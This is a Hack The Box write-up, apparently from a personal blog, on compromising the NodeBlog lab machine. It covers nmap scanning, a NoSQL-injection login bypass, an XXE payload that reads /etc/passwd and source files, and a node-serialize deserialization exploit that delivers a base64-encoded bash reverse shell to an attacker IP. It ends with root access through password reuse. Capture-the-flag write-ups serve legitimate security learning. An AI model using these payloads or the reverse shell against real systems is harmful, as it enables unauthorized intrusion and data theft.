@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html class="direction--ltr"lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>NodeBlog HTB Write Up | AbusingLinux</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="NodeBlog HTB Write Up" />
+<meta name="author" content="isuckatlinux" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction Hello everyone! Today we are going to be pwning a HTB machine called NodeBlog. This is an easy machine, we are going to be covering a few fundamental attacks like xxe-injection or nosql-injection as asuch as deserialization (in node.js). Have fun reading!" />
+<meta property="og:description" content="Introduction Hello everyone! Today we are going to be pwning a HTB machine called NodeBlog. This is an easy machine, we are going to be covering a few fundamental attacks like xxe-injection or nosql-injection as asuch as deserialization (in node.js). Have fun reading!" />
+<link rel="canonical" href="https://abusinglinux.com//2022/01/18/nodeblog-writeup.html" />
+<meta property="og:url" content="https://abusinglinux.com//2022/01/18/nodeblog-writeup.html" />
+<meta property="og:site_name" content="AbusingLinux" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-01-18T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="NodeBlog HTB Write Up" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"isuckatlinux"},"dateModified":"2022-01-18T00:00:00+00:00","datePublished":"2022-01-18T00:00:00+00:00","description":"Introduction Hello everyone! Today we are going to be pwning a HTB machine called NodeBlog. This is an easy machine, we are going to be covering a few fundamental attacks like xxe-injection or nosql-injection as asuch as deserialization (in node.js). Have fun reading!","headline":"NodeBlog HTB Write Up","mainEntityOfPage":{"@type":"WebPage","@id":"https://abusinglinux.com//2022/01/18/nodeblog-writeup.html"},"url":"https://abusinglinux.com//2022/01/18/nodeblog-writeup.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" />
+  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://abusinglinux.com//feed.xml" title="AbusingLinux" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
+  <script src="/assets/js/jquery.magnific-popup.js"></script>
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">AbusingLinux<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/ISuckAtLinuxxx"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-purple-hover" href="https://github.com/isuckatlinux"><i class="fab fa-github-square"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+
+
+<img src="
+    /assets/linux.gif
+" class="author-avatar" alt="Avatar" />
+<div class="description">Hi, Im Pedro García a cybersecurity and ethical hacking learner. I will be sharing on this web site all my knowledge of these particular arts. I hope you enjoy this blog as much as I do writting all this! <3
+</div>
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">NodeBlog HTB Write Up</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/hackthebox/">hackthebox</a>
+      
+      <a class="tag" href="/tag/writeup/">writeup</a>
+      
+      <a class="tag" href="/tag/nosqlinyection/">nosqlinyection</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 18 Jan 2022</div>
+  
+  <h2 id="introduction">Introduction</h2>
+<p>Hello everyone! Today we are going to be pwning a HTB machine called NodeBlog. This is an easy machine, we are going to be covering a few fundamental attacks like xxe-injection or nosql-injection as asuch as deserialization (in node.js). Have fun reading!</p>
+
+<h2 id="ports-recognizement">Ports recognizement</h2>
+<p>The ip address of the machine is 10.10.11.139
+We are going to recognise all the post open on the machine and export the result into a grepeable file:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.11.139 <span class="nt">-oG</span> ports
+</code></pre></div></div>
+<p>The ports open are 22,5000</p>
+
+<p>We are going to scan this ports and export into a nmap file</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sSV</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-p22</span>,5000 <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.11.139 <span class="nt">-oN</span> services
+</code></pre></div></div>
+<p>We can see there is a ssh service running at port 22 and a http (node.js) service running at port 5000</p>
+
+<h2 id="inspect-the-web-and-fuzzing">Inspect the web and fuzzing</h2>
+<p>While we inspect the web we are going to leave wfuzz fuzzing the site in case it find something relevant.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">--hc</span> 404 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-c</span> <span class="nt">-u</span> 10.10.11.139:5000/FUZZ
+</code></pre></div></div>
+
+<p>We can see a green login button. Let’s proceed.
+We can see a login form.
+We can try some sql inyection inputs like ‘ or ‘ – -
+but won’t work.</p>
+
+<p>We have to test also nosql inyection. <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection">PayloadAllTheThings</a> have some exploit to bypass login form.
+We are going to use burpsuite to intercept the response and modify the fields on the forms.</p>
+
+<p>If we input random logins we have the response Invalid Username, but if we set in the username field admin and in the password random text we get Invalid Password, so we have a method to get users.
+Now we can try bypass the password with nosqli.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"user"</span>: <span class="s2">"admin"</span>, <span class="s2">"password"</span>: <span class="o">{</span><span class="s2">"</span><span class="nv">$ne</span><span class="s2">"</span>: null<span class="o">}}</span>
+</code></pre></div></div>
+<p>Also we can make a script to dump all posible usernames ans their relative passwords <a href="https://github.com/isuckatlinux/htbmachines/blob/main/nodeblog/scripts/nosqlbruteforce.py">nosqlforce.py</a></p>
+
+<blockquote>
+  <p>WE ARE INSIDE :boom:
+<br /></p>
+</blockquote>
+
+<p>We see an upload button. We try to upload a random file and we get this response:</p>
+
+<p>This might be a vulnerability to XXE inyection.
+Also <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection">PayloadAllTheThings</a> cover this subject with some payloads.
+We can try some payloads like</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM 'file:///etc/passwd'&gt;</span>]&gt;<span class="nt">&lt;root&gt;</span><span class="ni">&amp;test;</span><span class="nt">&lt;/root&gt;</span>
+</code></pre></div></div>
+<p>In /etc/passwd we set the path to the file we want to see.
+We create an xml file with this payload and we can try to upload this.</p>
+
+<p>We have a response that tell us that we give the xml in the incorrect format. If we inspect the code we can see that the correct format is:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invalid XML Example: <span class="nt">&lt;post&gt;&lt;title&gt;</span>Example Post<span class="nt">&lt;/title&gt;&lt;description&gt;</span>Example Description<span class="nt">&lt;/description&gt;&lt;markdown&gt;</span>Example Markdown<span class="nt">&lt;/markdown&gt;&lt;/post&gt;</span>
+</code></pre></div></div>
+
+<p>So we modify our payload to follow that structure:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE data [
+&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;</span>
+]&gt;
+<span class="nt">&lt;post&gt;</span>
+        <span class="nt">&lt;title&gt;</span>Example Post<span class="nt">&lt;/title&gt;</span>
+        <span class="nt">&lt;description&gt;</span>Example Description<span class="nt">&lt;/description&gt;</span>
+        <span class="nt">&lt;markdown&gt;</span><span class="ni">&amp;file;</span><span class="nt">&lt;/markdown&gt;</span>
+<span class="nt">&lt;/post&gt;</span>
+</code></pre></div></div>
+<p>The &amp;file; contains the output of the payload.</p>
+
+<p>If we look into the source code of the web site we can see the /etc/passwd file wich contains multiple users of the system.</p>
+
+<p>At his point we can enumerate multiple files of the machine.
+We can make a simple script which is going to help to enumerate the site faster <a href="https://github.com/isuckatlinux/htbmachines/blob/main/nodeblog/scripts/xxe-file-dumper.py">xxe-file-dumper.py</a></p>
+
+<p>Let’s continue looking the website. If we try to post another article by our own we get an error:</p>
+
+<p>We can see the web is hosted on the /opt/blog.
+We can look for a server.js or main.js file which usually have the main server code of the web server. Let’s try it. We are going to use <a href="https://github.com/isuckatlinux/htbmachines/blob/main/nodeblog/scripts/xxe-file-dumper.py">xxe-file-dumper.py</a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 xxe-file-dumper.py <span class="nt">-u</span> http://10.10.11.139:5000/articles/xml <span class="nt">-f</span> /opt/blog/server.js
+</code></pre></div></div>
+
+<p>We can see the we have an output file:</p>
+<pre><code class="language-node">const express = require(&amp;#39;express&amp;#39;)
+const mongoose = require(&amp;#39;mongoose&amp;#39;)
+const Article = require(&amp;#39;./models/article&amp;#39;)
+const articleRouter = require(&amp;#39;./routes/articles&amp;#39;)
+const loginRouter = require(&amp;#39;./routes/login&amp;#39;)
+const serialize = require(&amp;#39;node-serialize&amp;#39;)
+const methodOverride = require(&amp;#39;method-override&amp;#39;)
+const fileUpload = require(&amp;#39;express-fileupload&amp;#39;)
+const cookieParser = require(&amp;#39;cookie-parser&amp;#39;);
+const crypto = require(&amp;#39;crypto&amp;#39;)
+const cookie_secret = &amp;#34;UHC-SecretCookie&amp;#34;
+//var session = require(&amp;#39;express-session&amp;#39;);
+const app = express()
+
+mongoose.connect(&amp;#39;mongodb://localhost/blog&amp;#39;)
+
+app.set(&amp;#39;view engine&amp;#39;, &amp;#39;ejs&amp;#39;)
+app.use(express.urlencoded({ extended: false }))
+app.use(methodOverride(&amp;#39;_method&amp;#39;))
+app.use(fileUpload())
+app.use(express.json());
+app.use(cookieParser());
+//app.use(session({secret: &amp;#34;UHC-SecretKey-123&amp;#34;}));
+
+function authenticated(c) {
+    if (typeof c == &amp;#39;undefined&amp;#39;)
+        return false
+
+    c = serialize.unserialize(c)
+
+    if (c.sign == (crypto.createHash(&amp;#39;md5&amp;#39;).update(cookie_secret + c.user).digest(&amp;#39;hex&amp;#39;)) ){
+        return true
+    } else {
+        return false
+    }
+}
+
+
+app.get(&amp;#39;/&amp;#39;, async (req, res) =&amp;gt; {
+    const articles = await Article.find().sort({
+        createdAt: &amp;#39;desc&amp;#39;
+    })
+    res.render(&amp;#39;articles/index&amp;#39;, { articles: articles, ip: req.socket.remoteAddress, authenticated: authenticated(req.cookies.auth) })
+})
+
+app.use(&amp;#39;/articles&amp;#39;, articleRouter)
+app.use(&amp;#39;/login&amp;#39;, loginRouter)
+
+
+app.listen(5000)
+</code></pre>
+
+<p>We can see that the server is using an unserialize function without sanitaze input. This can be a desirializing vulneravility.</p>
+
+<p>Usually the unserialize input is the cookie, because this and It’s called c the code is probably deserializing the cookie.</p>
+
+<p>The problem about the insecure deserilization is that if you use IIFE you can execute code when the function is deserializating even before the string is interpreted. So we can send the payload into the cookie, when the server desirialize the string, this will be executed even the cookie doen’t have any sense.
+This <a href="https://sking7.github.io/articles/1601216121.html">post</a> explain it pretty well.
+The payload is the next:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="dl">"</span><span class="s2">rce</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">_$$ND_FUNC$$_function(){require('child_process').exec('ls', function(error, stdout, stderr){console.log(stdout)});}()</span><span class="dl">"</span><span class="p">}</span>
+</code></pre></div></div>
+
+<p>We can inject a revershell payload into the code that we want to run.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/<span class="o">{</span>your_tun0_ip<span class="o">}</span>/443 0&gt;&amp;1
+</code></pre></div></div>
+<p>In order to pass this code into the url we have to convert it in base64</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/{your_tun0_ip}/443 0&gt;&amp;1'</span> | <span class="nb">base64</span>
+</code></pre></div></div>
+<p>In the victim’s machine we have to reverse the base64 format, so our final reverse shell payload is:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo </span>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41LzQ0MyAwPiYxCg<span class="o">==</span>|base64 <span class="nt">-d</span>|bash
+</code></pre></div></div>
+<p>We mix it the the rec payload, the result:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="dl">"</span><span class="s2">rce</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">_$$ND_FUNC$$_function(){require('child_process').exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41LzQ0MyAwPiYxCg==|base64 -d|bash', function(error, stdout, stderr){console.log(stdout)});}()</span><span class="dl">"</span><span class="p">}</span>
+</code></pre></div></div>
+
+<p>With burpsuite we modify the cookie when we make a get request to the main page, we introduce the payload into the cookie. Mention that we have to previusly url encode this entire payload beacuse they are special character that mean’s another thing in a url format (like ;).
+Encoding all will asure us that the payload will work fine.</p>
+
+<p>We start listening with netcat in the 443 port</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nc <span class="nt">-lnvp</span> 443
+</code></pre></div></div>
+
+<p>We send the payload, and we have a shell!
+We can try to capture the flag which is alocate at /home/admin/user.txt
+For some reason we dont hace permission to read the content of the folder, but our user owns the folder, so we just can chnage permission of the folder with</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod</span> +x /home/admin
+</code></pre></div></div>
+<p>Now we can see the flag!</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /home/admin/user.txt
+</code></pre></div></div>
+
+<h2 id="privilige-escalation">Privilige escalation</h2>
+<p>We can try use the same password to the super user</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su
+</code></pre></div></div>
+<p>We introduce the password which we captured before when we dump the password of admin user with <a href="https://github.com/isuckatlinux/htbmachines/blob/main/nodeblog/scripts/nosqlbruteforce.py">nosqlforce.py</a>.
+They reuse the password so we are already logged root.
+We can capture the flag which is located at /root/root.txt</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /root/root.txt
+</code></pre></div></div>
+
+<p>Thank’s all for reading! 📖</p>
+
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'https://abusinglinux.com//2022/01/18/nodeblog-writeup.html';
+     this.page.identifier = '/2022/01/18/nodeblog-writeup';
+     this.page.title = 'NodeBlog HTB Write Up';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//https://abusinglinux.com/.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2022/09/07/backdoor-htb-writeup.html">
+            Backdoor HTB WriteUp
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/07/07/storing-api-credentials-in-Python.html">
+            Storing API credentials on Python
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/02/11/get-full-interactive-reverse-shell-with-socat.html">
+            Get Full Interactive reverse Shell With Socat
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/python/" class="set-1">Python</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/eternal-blue/" class="set-1">eternal-blue</a> <a href="/tag/good-practice/" class="set-1">good-practice</a> <a href="/tag/hackthebox/" class="set-5">hackthebox</a> <a href="/tag/moodle/" class="set-1">moodle</a> <a href="/tag/nosqlinyection/" class="set-1">nosqlinyection</a> <a href="/tag/parrot/" class="set-1">parrot</a> <a href="/tag/pentest-basics/" class="set-2">pentest-basics</a> <a href="/tag/python2/" class="set-1">python2</a> <a href="/tag/rce/" class="set-4">rce</a> <a href="/tag/reverse-shell/" class="set-4">reverse-shell</a> <a href="/tag/screen/" class="set-1">screen</a> <a href="/tag/socat/" class="set-1">socat</a> <a href="/tag/wordpress/" class="set-1">wordpress</a> <a href="/tag/writeup/" class="set-4">writeup</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = '';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+
+  // Image modal
+  var $imgs = [];
+  $('img').each(function(idx) {
+    var obj = {
+      src: $(this).attr('src')
+    }
+    $imgs.push(obj);
+    var elem = $(this);
+    $(this).click(function() {
+      $('.modal').magnificPopup('open', idx);
+    });
+  });
+
+  $('.modal').magnificPopup({
+    items: $imgs,
+    type: 'image',
+    closeOnContentClick: true,
+    mainClass: 'mfp-img-mobile',
+    image: {
+      verticalFit: true
+    }
+    
+  });
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
